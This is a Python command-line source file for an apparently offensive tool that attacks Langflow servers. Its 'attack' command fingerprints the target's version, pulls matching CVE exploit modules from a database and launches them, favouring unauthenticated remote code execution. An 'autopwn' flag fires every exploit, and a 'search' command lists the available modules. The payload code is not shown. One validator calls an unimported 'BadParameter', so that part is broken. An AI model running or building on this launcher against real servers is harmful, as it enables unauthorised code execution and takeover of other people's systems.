import re
import sys
import click
from urllib.parse import urlparse
from flowhound.cli.banner import banner
from flowhound.cli.message_format import output_status, output_warning, output_error
from flowhound.vulnerabilities.io.database import Database
from flowhound.vulnerabilities.io.version_detection import get_target_version


def _validate_url(ctx, param, value) -> str:
    try:
        result = urlparse(value)
    except Exception as e:
        raise click.BadParameter(f'Malformed URL: {value}')

    if not result.scheme in ("http", "https") or not bool(result.netloc):
        raise click.BadParameter(f'Malformed URL: {value}')

    return value


def _validate_cve(ctx, param, value) -> str:
    val_lowered = value.lower()
    if value and not re.match('cve-\\d{4}-\\d{4,7}', val_lowered):
        raise BadParameter('Must provide a correctly formatted CVE code.')
    
    return val_lowered


@click.command()
@click.option('--url', required=True, help='URL of target Langflow instance', callback=_validate_url)
@click.option('--username', required=False, default='', help='Target Langflow instance username')
@click.option('--password', required=False, default='', help='Target Langflow instance password')
@click.option('--autopwn', required=False, is_flag=True, default=False, help='Launch all available exploits, instead of stopping at first successful attempt.')
def attack(url: str, username: str, password: str, autopwn: bool):
    banner()
    db_inst = Database()
    has_credentials = False
    output_status("Checking target Langflow version.")

    if any([username, password]) and not all([username, password]):
        raise click.BadParameter('`--username` and `--password` must be provided together.')
    elif username and password:
        has_credentials = True
        output_warning("Langflow login credentials detected. Results will Include Auth RCE exploit modules.")

    # Determine victim langflow version
    try:
        target_version = get_target_version(base_url=url)
    except RuntimeError as e:
        output_error(str(e))
        sys.exit(1)

    # Determine vulns & corresponding exploit modules
    try:
        vuln_lst = db_inst.retrieve_vulnerabilities(target_version=target_version, is_auth=has_credentials)
    except Exception as e:
        output_error(str(e))
        sys.exit(1)

    # Fire exploits
    output_status(f"{len(vuln_lst)} exploit(s) detected. Prioritizing unauth RCE exploits.")
    for vuln in vuln_lst:
        output_status("Launching exploit for {} that impacts Langflow versions {} through {}".format(
            vuln.get_cve(), vuln.get_min_impacted_version(), vuln.get_max_impacted_version()
        ), space=True)
        exploit_module = vuln.get_exploit_instance()
        result = exploit_module.exploit(base_url=url, username=username, password=password)

        if not autopwn and result:
            output_status(f"Exploitation successful. Stopping at first attempt.")
            break


@click.command()
@click.option('--cve', required=False, default='', help='CVE ID', callback=_validate_cve)
def search(cve: str):
    if cve:
        output_status(f"Searching for exploit code for {cve}.")
    else:
        output_status("Retrieving list of exploits.")

    db_inst = Database()
    try:
        vuln_lst = db_inst.search_vulnerabilities(cve=cve)
    except Exception as e:
        output_error(str(e))
        sys.exit(1)
    
    for vuln in vuln_lst:
        output_status(f"FOUND: {vuln.get_exploit_module()}")
